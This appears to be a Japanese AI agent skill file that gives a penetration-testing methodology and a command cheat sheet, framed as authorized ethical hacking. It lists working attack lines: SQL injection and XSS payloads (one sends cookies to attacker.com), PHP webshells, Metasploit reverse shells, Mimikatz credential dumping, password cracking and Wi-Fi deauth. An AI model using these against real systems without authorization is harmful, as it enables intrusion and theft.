---
name: "penetration-testing"
description: >
  ペネトレーションテストの実施を支援します。Nmap、Metasploit、Burp Suite、Kali Linux等の
  ツール使用、Webアプリ脆弱性検査（SQLi、XSS、CSRF、IDOR等）、ネットワーク侵入テスト、
  報告書作成など、倫理的ハッキングと脆弱性評価に使用します。
  キーワード - ペネトレーションテスト、倫理的ハッキング、Metasploit、Burp Suite、脆弱性診断、
  SQLインジェクション、XSS。
version: 1.0.0
---

# ペネトレーションテストスキル

## 目的

このスキルは、倫理的ハッキングとペネトレーションテストの方法論とツールを提供します。
偵察、スキャン、エクスプロイト、権限昇格、永続化、証跡隠滅までのフルサイクルをカバーし、
組織のセキュリティ態勢を評価するための実践的知識を含みます。

**重要:** このスキルは防御目的の脆弱性評価にのみ使用してください。
適切な許可なしにこれらの技術を使用することは違法です。

## このスキルを使用する場合

- ペネトレーションテストの実施計画や方法論を求めた場合
- Web アプリケーションの脆弱性診断を必要とする場合
- ネットワークインフラの侵入テストを実施する場合
- エクスプロイトツールの使用方法を知りたい場合
- ペネトレーションテスト報告書を作成する場合

## ペネトレーションテスト方法論

### フェーズ

1. **Pre-Engagement（事前準備）**
   - スコープ定義
   - Rules of Engagement（ROE）
   - 契約と許可

2. **偵察（Reconnaissance）**
   - パッシブ偵察
   - アクティブ偵察
   - OSINT

3. **スキャン（Scanning）**
   - ポートスキャン
   - サービス列挙
   - 脆弱性スキャン

4. **エクスプロイト（Exploitation）**
   - 脆弱性の悪用
   - 初期アクセス取得

5. **権限昇格（Privilege Escalation）**
   - ローカル権限昇格
   - ドメイン権限昇格

6. **横展開（Lateral Movement）**
   - 内部ネットワーク侵入
   - 追加システムの侵害

7. **永続化（Persistence）**
   - バックドア設置
   - 継続的アクセス確保

8. **証跡隠滅（Covering Tracks）**
   - ログ削除
   - 痕跡消去

9. **報告（Reporting）**
   - 脆弱性文書化
   - 修復推奨事項

## 偵察（Reconnaissance）

### OSINT（Open Source Intelligence）

```bash
# Whois情報
whois target.com

# DNS情報
dig target.com ANY
nslookup -type=MX target.com

# サブドメイン列挙
subfinder -d target.com
amass enum -d target.com

# Google Dorking
site:target.com filetype:pdf
site:target.com inurl:admin
intitle:"index of" site:target.com

# Shodan
shodan search "target.com"
shodan host 192.168.1.1

# theHarvester（メール、サブドメイン収集）
theHarvester -d target.com -b google,bing,linkedin

# Wayback Machine
waybackurls target.com
```

### ソーシャルメディアOSINT

```bash
# Sherlock（ユーザー名検索）
sherlock username

# Maltego（視覚的OSINT）
# GUI ツール

# SpiderFoot
spiderfoot -s target.com
```

## スキャン

### Nmap

```bash
# 基本スキャン
nmap -sV -sC target.com

# 全ポートスキャン
nmap -p- target.com

# ステルススキャン
nmap -sS -p 80,443 target.com

# UDPスキャン
nmap -sU -p 53,161,500 target.com

# OS検出
nmap -O target.com

# スクリプトスキャン
nmap --script vuln target.com
nmap --script=http-enum target.com

# 高速スキャン
nmap -T4 -F target.com

# 出力
nmap -oA output target.com  # すべての形式で保存
```

### サービス列挙

**SMB（445）:**

```bash
# SMB列挙
enum4linux -a target
smbclient -L //target/
smbmap -H target

# Null セッション
smbclient //target/IPC$ -N
```

**SNMP（161）:**

```bash
# コミュニティ文字列ブルートフォース
onesixtyone -c community.txt target

# SNMP Walk
snmpwalk -v2c -c public target
```

**NFS（2049）:**

```bash
# NFS共有表示
showmount -e target

# マウント
mount -t nfs target:/share /mnt/nfs
```

## Webアプリケーション診断

### Burp Suite

基本ワークフロー:
1. Proxyでリクエストインターセプト
2. Repeaterで手動テスト
3. Intruderで自動攻撃
4. Scannerで脆弱性スキャン

**インターセプト設定:**
```
Proxy → Options → Intercept Client Requests
ブラウザプロキシ設定: 127.0.0.1:8080
```

### OWASP ZAP

```bash
# 自動スキャン
zap-cli quick-scan http://target.com

# Spider
zap-cli spider http://target.com

# Active Scan
zap-cli active-scan http://target.com

# レポート
zap-cli report -o report.html -f html
```

### SQLインジェクション

**手動テスト:**

```sql
# 基本テスト
' OR '1'='1
' OR 1=1--
" OR "1"="1

# Union-based
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,@@version,3--

# Time-based blind
' OR SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

# Error-based
' AND 1=CONVERT(int,(SELECT @@version))--
```

**SQLmap:**

```bash
# 基本スキャン
sqlmap -u "http://target.com/page?id=1"

# POSTパラメータ
sqlmap -u "http://target.com/login" --data="username=admin&password=pass"

# Cookie
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123"

# データベース列挙
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --columns
sqlmap -u "http://target.com/page?id=1" -D database -T users -C username,password --dump

# OSシェル取得
sqlmap -u "http://target.com/page?id=1" --os-shell
```

### XSS（Cross-Site Scripting）

**Reflected XSS:**

```html
<!-- 基本ペイロード -->
<script>alert('XSS')</script>

<!-- 難読化 -->
<img src=x onerror=alert('XSS')>
<svg/onload=alert('XSS')>

<!-- クッキー窃取 -->
<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

<!-- フィルタバイパス -->
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<ScRiPt>alert('XSS')</ScRiPt>
```

**Stored XSS:**
ユーザー入力が保存され、他のユーザーに表示される

**DOM XSS:**
JavaScriptでDOMを直接操作する脆弱性

**XSStrike:**

```bash
xsstrike -u "http://target.com/search?q=test"
```

### CSRF（Cross-Site Request Forgery）

PoC例:

```html
<html>
  <body>
    <form action="http://target.com/transfer" method="POST">
      <input type="hidden" name="to" value="attacker" />
      <input type="hidden" name="amount" value="1000" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

### ファイルアップロード脆弱性

```bash
# バイパス手法
shell.php.jpg      # 拡張子偽装
shell.pHp          # 大文字小文字
shell.php%00.jpg   # Null byte
shell.php;.jpg     # セミコロン

# Magic Bytes改ざん
# PNGヘッダー追加
echo -e '\x89PNG\r\n\x1a\n' > shell.php.png
cat shell_code.php >> shell.php.png

# Webshell例
<?php system($_GET['cmd']); ?>
<?php eval($_POST['code']); ?>
```

## ネットワーク侵入テスト

### Metasploit Framework

```bash
# msfconsole起動
msfconsole

# エクスプロイト検索
search ms17-010
search type:exploit platform:windows

# エクスプロイト使用
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
exploit

# Meterpreter
meterpreter> sysinfo
meterpreter> getuid
meterpreter> ps
meterpreter> migrate 1234
meterpreter> hashdump
meterpreter> screenshot
meterpreter> download c:\\file.txt
meterpreter> upload tool.exe c:\\
meterpreter> shell
```

### 権限昇格

**Windows:**

```powershell
# 脆弱なサービス検索
Get-WmiObject win32_service | Where-Object {$_.PathName -notmatch '"'}

# AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Token Impersonation
# ポテトExploit（JuicyPotato、RoguePotato等）

# Mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::sam
```

**Linux:**

```bash
# SUID検索
find / -perm -4000 -type f 2>/dev/null

# Sudoers
sudo -l

# Kernel Exploit
uname -a
searchsploit "Linux Kernel 4.4"

# Cron Jobs
cat /etc/crontab
ls -la /etc/cron.d/

# Capabilities
getcap -r / 2>/dev/null
```

**LinPEAS / WinPEAS:**

```bash
# Linux
./linpeas.sh

# Windows
.\winPEASx64.exe
```

### パスワードクラッキング

**Hydra:**

```bash
# SSH
hydra -l admin -P passwords.txt ssh://target

# HTTP POST
hydra -l admin -P passwords.txt target http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"

# FTP
hydra -L users.txt -P passwords.txt ftp://target
```

**Hashcat:**

```bash
# MD5
hashcat -m 0 -a 0 hashes.txt wordlist.txt

# NTLM
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt

# WPA/WPA2
hashcat -m 2500 -a 0 capture.hccapx wordlist.txt

# ルールベース
hashcat -m 0 -a 0 hashes.txt wordlist.txt -r rules/best64.rule
```

**John the Ripper:**

```bash
# パスワードファイル
john --wordlist=rockyou.txt hashes.txt

# Unshadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john unshadowed.txt

# ZIP
zip2john file.zip > hash.txt
john hash.txt
```

## ワイヤレステスト

### Wi-Fi（WPA/WPA2）

```bash
# モニターモード有効化
airmon-ng start wlan0

# APスキャン
airodump-ng wlan0mon

# ハンドシェイクキャプチャ
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Deauth攻撃（handshake強制）
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# クラッキング
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
```

## ソーシャルエンジニアリング

### フィッシング（教育目的）

**Gophish:**
- フィッシングキャンペーン管理
- テンプレート作成
- トラッキングとレポート

**SET (Social Engineering Toolkit):**

```bash
setoolkit

# メニュー
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
```

## ポストエクスプロイト

### 認証情報ダンプ

**Mimikatz:**

```
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

**Impacket:**

```bash
# SecretsDump
secretsdump.py domain/user:password@target

# Pass-the-Hash
psexec.py -hashes :ntlmhash domain/user@target

# Kerberoasting
GetUserSPNs.py -request domain/user:password
```

### データ窃取

```bash
# 機密ファイル検索
find / -name "*.key" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*password*" 2>/dev/null

# Windows
dir /s /b *password*
findstr /si password *.txt *.xml *.ini
```

## レポート作成

### エグゼクティブサマリー

- リスク評価
- 主要な発見
- ビジネスインパクト
- 推奨事項の優先順位

### 技術的詳細

各脆弱性:
- タイトル
- CWE/CVSS
- 影響
- 再現手順
- 修復方法
- スクリーンショット

### Dradis Framework

レポート作成自動化ツール

```bash
# インポート
dradis-upload nmap.xml
dradis-upload burp.xml

# エクスポート
dradis-export --format html
```

## ベストプラクティス

1. **許可の取得**
   - 書面による明示的な許可
   - スコープの明確化
   - 緊急連絡先

2. **安全性**
   - DoSテストは慎重に
   - 本番環境への影響最小化
   - バックアップ確認

3. **倫理**
   - スコープ内のみテスト
   - 発見した脆弱性の適切な報告
   - データプライバシーの尊重

4. **文書化**
   - すべての手順を記録
   - タイムスタンプ付き
   - 再現可能な証拠

## 参考リソース

- OWASP Testing Guide
- PTES (Penetration Testing Execution Standard)
- NIST SP 800-115
- HTB (Hack The Box)
- TryHackMe

## 注意事項

**重要:** このスキルに含まれる技術は、適切な許可を得た環境でのみ使用してください。
無許可での使用は違法であり、刑事罰の対象となります。

- 書面による許可必須
- スコープ厳守
- 法的リスクの理解
- 倫理的行動
